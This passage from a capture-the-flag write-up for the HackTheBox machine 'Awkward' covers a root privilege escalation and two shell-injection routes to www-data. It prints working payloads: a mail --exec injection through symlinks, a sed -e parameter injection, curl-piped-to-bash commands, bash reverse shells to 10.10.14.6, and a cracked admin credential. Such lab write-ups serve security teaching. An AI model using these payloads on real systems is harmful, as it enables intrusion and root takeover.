admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1:014mrbeanrules!#P

```

#### Store

The store site looks like a store:

[![](https://0xdfimages.gitlab.io/img/image-20221004142027386.png)](https://0xdfimages.gitlab.io/img/image-20221004142027386.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20221004142027386.png)

Shopping around, I can add items to my cart:

[![image-20221004142056677](https://0xdfimages.gitlab.io/img/image-20221004142056677.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221004142056677.png)

It generates a file in `/var/www/store/cart` that matches a user id stored in the site’s local storage:

[![image-20221004142234354](https://0xdfimages.gitlab.io/img/image-20221004142234354.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221004142234354.png)

```

bean@awkward:/var/www/store/cart$ ls
8b80-fbfb-a3c-e97a
bean@awkward:/var/www/store/cart$ cat 8b80-fbfb-a3c-e97a 
***Hat Valley Cart***
item_id=1&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
item_id=1&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90

```

The “Add to cart” code is in `cart_actions.php`:

```

//add to cart                                 
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'add_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {                                                                        
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }                   
    }
                                                    
    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }      
    }                                   
    
    if(checkValidItem("{$STORE_HOME}product-details/{$item_id}.txt")) {
        if(!file_exists("{$STORE_HOME}cart/{$user_id}")) {
            system("echo '***Hat Valley Cart***' > {$STORE_HOME}cart/{$user_id}");
        }
        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
        echo "Item added successfully!";
    }
    else {
        echo "Invalid item";
    }            
    exit;    
}

```

An item must have a matching `product-details/{id}.txt` file. There are three of those:

```

bean@awkward:/var/www/store$ ls product-details/
1.txt  2.txt  3.txt
bean@awkward:/var/www/store$ cat product-details/1.txt 
***Hat Valley Product***
item_id=1&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90

```

Interestingly, both `product-details` and `cart` are world writable:

```

bean@awkward:/var/www/store$ ls -l
total 96
drwxrwxrwx 2 root root  4096 Oct  5 05:20 cart
-rwxr-xr-x 1 root root  3664 Sep 15 20:09 cart_actions.php
-rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php
-rwxr-xr-x 1 root root  9143 Sep 15 20:09 checkout.php
drwxr-xr-x 2 root root  4096 Sep 15 20:09 css
drwxr-xr-x 2 root root  4096 Sep 15 20:09 fonts
drwxr-xr-x 6 root root  4096 Sep 15 20:09 img
-rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php
drwxr-xr-x 3 root root  4096 Sep 15 20:09 js
drwxrwxrwx 2 root root  4096 Oct  5 05:20 product-details
-rwxr-xr-x 1 root root   918 Sep 15 20:09 README.md
-rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php
drwxr-xr-x 6 root root  4096 Sep 15 20:09 static
-rwxr-xr-x 1 root root   695 Sep 15 20:09 style.css

```

#### Processes

Nothing jumps out from the process list. I’ll run PSpy to look for any crons that are running. I’ll remember before that leave requests are sent to Christine. If I generate a leave request with `pspy64` running, processes start:

```

2022/10/05 04:57:15 CMD: UID=0    PID=3440   | mail -s Leave Request: christopher.jones christine 
2022/10/05 04:57:15 CMD: UID=0    PID=3441   | /usr/sbin/sendmail -oi -f root@awkward -t 
2022/10/05 04:57:15 CMD: UID=0    PID=3442   | /usr/sbin/postdrop -r 
2022/10/05 04:57:15 CMD: UID=0    PID=3443   | cleanup -z -t unix -u -c 
2022/10/05 04:57:15 CMD: UID=0    PID=3444   | trivial-rewrite -n rewrite -t unix -u -c 
2022/10/05 04:57:15 CMD: UID=0    PID=3445   | local -t unix 
2022/10/05 04:57:15 CMD: UID=33   PID=3446   | /bin/sh -c awk '/christopher.jones/' /var/www/private/leave_requests.csv 

```

It’s calling `mail` to send something to christine. The user’s name is in the subject line, and is likely command injectable if I can get data into `/private/leave_requests.csv`.

### Command Injection

#### Write to leave\_requests.cve

To show that I can write to this file, I’ll first remove my cart and add it back as a symlink to `leave_requests.csv`:

```

bean@awkward:/var/www/store/cart$ ls
8b80-fbfb-a3c-e97a
bean@awkward:/var/www/store/cart$ ln -sf /var/www/private/leave_requests.csv 8b80-fbfb-a3c-e97a
bean@awkward:/var/www/store/cart$ ls -l
total 0
lrwxrwxrwx 1 bean bean 35 Oct  5 05:41 8b80-fbfb-a3c-e97a -> /var/www/private/leave_requests.csv

```

I’ll build a malicious product. It must have the first line with `***Hat Valley Product***`, and it’s the second line that gets added to the cart. I’ll get that from `1.txt`, and then add my own description:

```

bean@awkward:/var/www/store/product-details$ head -1 1.txt > 223.txt
bean@awkward:/var/www/store/product-details$ echo '0xdf 0xdf' >> 223.txt 
bean@awkward:/var/www/store/product-details$ cat 223.txt 
***Hat Valley Product***
0xdf 0xdf

```

Now I’ll find the request in Burp to add an item to the cart, and send it to Repeater. I’ll change the item number, and send:

[![image-20221004143500108](https://0xdfimages.gitlab.io/img/image-20221004143500108.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221004143500108.png)

Immediately in PSpy:

```

2022/10/05 05:34:46 CMD: UID=0    PID=3757   | mail -s Leave Request: 0xdf 0xdf christine 

```

#### Inject into mail

The [GTFOBins page for mail](https://gtfobins.github.io/gtfobins/mail/) shows that I just need the `--exec=![full path]` to run something.

I’ll write a Bash script to create a SetUID `bash` binary (in `/tmp`, as `/dev/shm` is mounted `nosuid`):

```

bean@awkward:/var/www/store/product-details$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 4777 /tmp/0xdf' > /dev/shm/0xdf.sh
bean@awkward:/var/www/store/product-details$ chmod +x /dev/shm/0xdf.sh
bean@awkward:/var/www/store/product-details$ cat /dev/shm/0xdf.sh
#!/bin/bash

cp /bin/bash /tmp/0xdf
chmod 4777 /tmp/0xdf

```

Now I’ll update the product:

```

bean@awkward:/var/www/store/product-details$ head -1 1.txt > 223.txt
bean@awkward:/var/www/store/product-details$ echo '0xdf --exec="!/dev/shm/0xdf.sh"' >> 223.txt 

```

On adding it to my cart, now `0xdf` exists and is SetUID for root:

```

bean@awkward:/var/www/store/cart$ ls -l /tmp/0xdf 
-rwsrwxrwx 1 root root 1396520 Oct  5 05:42 /tmp/0xdf

```

It works:

```

bean@awkward:/var/www/store/cart$ /tmp/0xdf -p
0xdf-5.1# cat /root/root.txt
59fad68a************************

```

## Beyond Root

### Unintended Background

The path through Awkward relies on the user not getting execution as www-data for it to make any sense. For the foothold, I’ll get file read access as www-data, but use it to read bean’s backup file and get a shell as bean. To get root, I’ll use symlinks to trick www-data into writing other files, triggering the `mail` command injection.

If a player could get a shell as www-data, the root step would be significantly easier, and multiple steps would be skipped.

### Patched RCE as www-data

#### Changelog

HackTheBox issues a [changelog](https://app.hackthebox.com/machines/Awkward/changelog) two days after release for Awkward:

![image-20230217063439751](https://0xdfimages.gitlab.io/img/image-20230217063439751.png)

This command injection allowed for execution as www-data.

#### Original vs Patched

While I focused mostly on exploiting the `awk` injection in `/api/all-leave`, there was a similar call to `exec` in `/api/submit-leave`.

```

const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]

  const badInUser = bad.some(char => user.includes(char));
  const badInReason = bad.some(char => reason.includes(char));
  const badInStart = bad.some(char => start.includes(char));
  const badInEnd = bad.some(char => end.includes(char));

  if(badInUser || badInReason || badInStart || badInEnd) {
    return res.status(500).send("Bad character detected.")
  }

  const finalEntry = user + "," + reason + "," + start + "," + end + ",Pending\r"

  exec(`echo "${finalEntry}" >> /var/www/private/leave_requests.csv`, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send("Failed to add leave request")
    }
    return res.status(200).send("Successfully added new leave request")
  })

```

`user` comes from the JWT, and `reason`, `start`, and `end` are part of the POST request:

![image-20230217063838443](https://0xdfimages.gitlab.io/img/image-20230217063838443.png)

```

  const {reason, start, end} = req.body

```

On release, that endpoint looked like:

```

  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]

  const badInUser = bad.some(char => user.includes(char));

  if(badInUser) {
    return res.status(500).send("Bad character detected.")
  }

  const finalEntry = user + "," + reason + "," + start + "," + end + ",Pending\r"

  exec(`echo "${finalEntry}" >> /var/www/private/leave_requests.csv`, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send("Failed to add leave request")
    }
    return res.status(200).send("Successfully added new leave request")
  })

```

The box author and testers were clearly thinking about cookie manipulation and preventing command injection there, but missed the other user controlled input and preventing command injection there.

#### Make Box Vulnerable

With a root shell, I’ll find the server code in `ser4ver.js`, located at `/var/www/hat-valley.htb/server`. I’ll use `vim.tiny` to edit the file. Simply changing the `if` back should suffice:

![image-20230217065019659](https://0xdfimages.gitlab.io/img/image-20230217065019659.png)

For this change to show up on the running server, I’ll need to restart the `node` process. `ps` shows it running, with a parent process of `pm2`:

[![image-20230217070258605](https://0xdfimages.gitlab.io/img/image-20230217070258605.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20230217070258605.png)

[PM2](https://pm2.keymetrics.io/) is a process manager for Node.JS. To see the process, I’ll drop to a shell as www-data and run `pm2 list`. If I just run `su www-data`, it fails:

```

root@awkward:/# su www-data
This account is currently not available.

```

That’s because www-data’s shell is set to `nologin`, which just prints a message and exits:

```

root@awkward:/# grep www-data /etc/passwd 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
root@awkward:/# nologin
This account is currently not available.

```

It’s possible to set the shell with the `-s` option in `su`:

```

root@awkward:/# su www-data -s /bin/bash
www-data@awkward:/$ 

```

And now list PM2 processes:

```

www-data@awkward:/$ pm2 list
┌─────┬──────────────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name             │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼──────────────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0   │ npm run serve    │ default     │ N/A     │ fork    │ 1410     │ 7D     │ 0    │ online    │ 0%       │ 56.7mb   │ www-data │ disabled │
│ 1   │ server           │ default     │ 1.0.0   │ fork    │ 63950    │ 20m    │ 22   │ online    │ 0%       │ 61.7mb   │ www-data │ disabled │
└─────┴──────────────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘

```

The second line has the PID matching what I identified with `ps` above. I can restart it with `pm2 restart server`:

```

www-data@awkward:/$ pm2 restart server
Use --update-env to update environment variables
[PM2] Applying action restartProcessId on app [server](ids: [ 1 ])
[PM2] [server](1) ✓
┌─────┬──────────────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name             │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼──────────────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0   │ npm run serve    │ default     │ N/A     │ fork    │ 1410     │ 7D     │ 0    │ online    │ 0%       │ 56.7mb   │ www-data │ disabled │
│ 1   │ server           │ default     │ 1.0.0   │ fork    │ 64268    │ 0s     │ 23   │ online    │ 0%       │ 10.3mb   │ www-data │ disabled │
└─────┴──────────────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘

```

Alternatively, PM2 will make sure to keep the process running, so I can just kill the process and PM2 will immediately start a new one:

```

root@awkward:/# ps auxww | grep server
www-data   64268  1.0  1.4 774608 57812 ?        Ssl  23:10   0:00 node /var/www/hat-valley.htb/server
root@awkward:/# kill 64268
root@awkward:/# ps auxww | grep server
www-data   64281  0.0  1.4 776656 58556 ?        Ssl  23:11   0:00 node /var/www/hat-valley.htb/server

```

#### POC

With the checks on `reason`, `start`, and `end` removed, the vulnerable code is:

```

  const finalEntry = user + "," + reason + "," + start + "," + end + ",Pending\r"

  exec(`echo "${finalEntry}" >> /var/www/private/leave_requests.csv`, (error, stdout, stderr) => {

```

Because it’s being passed to `exec`, and because the stuff being `echo`ed is in `"` and not `'`, a subshell (`$( )`) will work nicely here. The execution will be blind to me, as the output goes into the `leave_requests.csv` file. I’ll use `curl` to connect back. I’ve written a dummy text file to `test` and served it with `python -m http.server`.

I’ll need a valid token, or I won’t reach the vulnerable code:

```

oxdf@hacky$ curl http:/hat-valley.htb/api/submit-leave -H "Content-type: application/json" -d '{"reason": "$(curl http://10.10.14.6/test)", "start": "today", "end": "tomorrow"}'
Invalid user

```

I’ll grab a token from a logged in session. Running now returns success:

```

oxdf@hacky$ token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc2NTU4MjMzfQ.fXwdefR-bakjLwjeO2BnDnoMXz2mWxN2rkkYusR8svk
oxdf@hacky$ curl http:/hat-valley.htb/api/submit-leave -H "Content-type: application/json" -d '{"reason": "$(curl http://10.10.14.6/test)", "start": "today", "end": "tomorrow"}' -b "token=$token"
Successfully added new leave request

```

There is also a request at my webserver:

```
10.10.11.185 - - [17/Feb/2023 12:15:16] "GET /test HTTP/1.1" 200 -

```

With the root shell, I can even see the results in `leave_requests.cvs`:

```

root@awkward:/var/www/private# cat leave_requests.csv 
Leave Request Database,,,,
,,,,
HR System Username,Reason,Start Date,End Date,Approved
bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
christine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yes
jackson.lightheart,Great uncle's goldfish funeral + ceremony,10/05/2022,10/06/2022,No
jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
christopher.jones,0xdf was here!,today,tomorrow,Pending

```

“0xdf was here!” is the contents of `test`.

#### Shell

To get a shell, I’ll create a simple [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) in a file called `shell`:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

Now I’ll `curl` that into `bash` on Awkward:

```

oxdf@hacky$ curl http:/hat-valley.htb/api/submit-leave -H "Content-type: application/json" -d '{"reason": "$(curl http://10.10.14.6/shell|/bin/bash)", "start": "today", "end": "tomorrow"}' -b "token=$token"

```

This time it just hangs. At `nc`, there’s a shell as www-data:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.185 54006
bash: cannot set terminal process group (64281): Inappropriate ioctl for device
bash: no job control in this shell
www-data@awkward:~/hat-valley.htb$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Unpatch RCE as www-data

#### Identify Parameter Injection

There’s another unpatched RCE as www-data via the store website (thanks to Ippsec for finding this one). This one comes a bit later in the box, and comes from a shell as bean.

As bean, I’m able to see the store source, and how the site is using files instead of a database. The action to delete an item from a cart (which is a file) uses `sed` in a `system` call:

```

//delete from cart                                                                                       
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];                                                                                                                                                                                         $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!
                                                    
    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }
                                                    
    foreach($bad_chars as $bad) {        
        if(strpos($user_id, $bad) !== FALSE) {                                                           
            echo "Bad character detected!";
            exit;
        }
    }
    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
        echo "Item removed from cart";
    }
    else {
        echo "Invalid item";
    }
    exit;
}

```

The user input is passed through a similar bad characters check as the previous API functions. But one character that’s allowed is `-`, which leaves open a parameter injection into `sed`.

The [man page](https://linux.die.net/man/1/sed) for `sed` shows a `-e` option:

> **-e** script, **–expression**=*script*
>
> add the script to the commands to be executed

#### Request Analysis

I’ll go to the store and add an item to my cart. Then at the cart screen, I’ll click the remove button and look at that request in Burp:

```

POST /cart_actions.php HTTP/1.1
Host: store.hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 49
Origin: http://store.hat-valley.htb
Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
Connection: close
Referer: http://store.hat-valley.htb/cart.php
Pragma: no-cache
Cache-Control: no-cache

item=1&user=8b80-fbfb-a3c-e97a&action=delete_item

```

The `system` call in the PHP looks like this, and it’s clear that I control `$item_id` and `$user_id`:

```

system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");

```

#### sed local POC

`-e` is typically used to run multiple `sed` commands, so `-e 's/foo/bar/g' -e 's/bar/baz/g'` would first replace “foo” with “bar”, and then replace all “bar” with “baz”.

Inside the `sed` script syntax, `1e [cmd]` means put the result of command as the first line. For example, working from my `hashes` file as an example (with four hash lines in it):

```

oxdf@hacky$ cat test 
This is a test file
oxdf@hacky$ sed -i '1e whoami' test
oxdf@hacky$ cat test 
oxdf
This is a test file

```

So what happens if I include `'/item_id=1` in front? Well this fails, and doesn’t change the file:

```

oxdf@hacky$ sed -i '/item_id=1' '1e id' test 
sed: -e expression #1, char 10: unterminated address regex

```

But if I give it `-e`, then it does work:

```

oxdf@hacky$ cat test 
This is a test file
oxdf@hacky$ sed -i '/item_id=1' -e '1e whoami' test
sed: can't read /item_id=1: No such file or directory
oxdf@hacky$ cat test 
oxdf
This is a test file

```

There’s a warning about the junk at the front, but then it does what I want it to. It turns out if I make the `'` good, the `'/d'` at the end won’t matter either:

```

oxdf@hacky$ cat test 
This is a test file
oxdf@hacky$ sed -i '/item_id=1' -e '1e whoami' '/d' test 
sed: can't read /item_id=1: No such file or directory
sed: can't read /d: No such file or directory
oxdf@hacky$ cat test 
oxdf
This is a test file

```

#### Building Remote POC

The `sed` on Awkward looks like:

```

sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}

```

If I set `$item_id` to `1' -e '1e /dev/shm/shell.sh' '`, then it becomes:

```

sed -i '/item_id=1' -e '1e /dev/shm/shell.sh' '/d' {$STORE_HOME}cart/{$user_id}

```

This matches exactly what I had above, except now it’s running `shell.sh`.

One gotcha to look out for - if your script (`shell.sh`) outputs any data, then that data will be added to the front of the file. But once that happens, it will fail the `checkValidItem` check, and never each `sed`:

```

    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
        echo "Item removed from cart";
    }
    else {
        echo "Invalid item";
    }

```

#### Shell

To run this on Awkward, I’ll create a simple reverse shell script:

```

bean@awkward:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/443 0>&1'
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1
bean@awkward:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/443 0>&1' > shell.sh
bean@awkward:/dev/shm$ chmod +x shell.sh 

```

I’ll also make sure I have something in my cart (or at least that the cart file exists). Then I can send the injection:

```

POST /cart_actions.php HTTP/1.1
Host: store.hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 78
Origin: http://store.hat-valley.htb
Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
Connection: close
Referer: http://store.hat-valley.htb/cart.php
Pragma: no-cache
Cache-Control: no-cache

item=1'+-e+'1e+/dev/shm/shell.sh'+'&user=8b80-fbfb-a3c-e97a&action=delete_item

```

It hangs, but there’s a connection at `nc` as www-data:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.185 40314
bash: cannot set terminal process group (1408): Inappropriate ioctl for device
bash: no job control in this shell
www-data@awkward:~/store$

```

### Path to root

With a shell as www-data, I don’t have to play with the store at all. I have write access to `leave_requests.csv`, and I can identify the incron that’s sending mail when that updates the same was as [above](#processes). I’ll stage a script to create a SetUID `bash` (just like [above](#inject-into-mail), making sure to `chmod +x` the script as well).

With that, I can write the `main` injection directly into the file:

```

www-data@awkward:~/private$ echo '0xdf --exec="!/dev/shm/0xdf.sh",,today,tomorrow,Pending' >> leave_requests.csv 

```

When the cron runs (almost instantly), there’s a `/tmp/0xdf` owned by root and with SetUID bit on:

```

www-data@awkward:~/private$ ls -l /tmp/0xdf 
-rwsrwxrwx 1 root root 1396520 Feb 17 23:32 /tmp/0xdf

```

It gives a root shell:

```

www-data@awkward:~/private$ /tmp/0xdf -p
0xdf-5.1#

```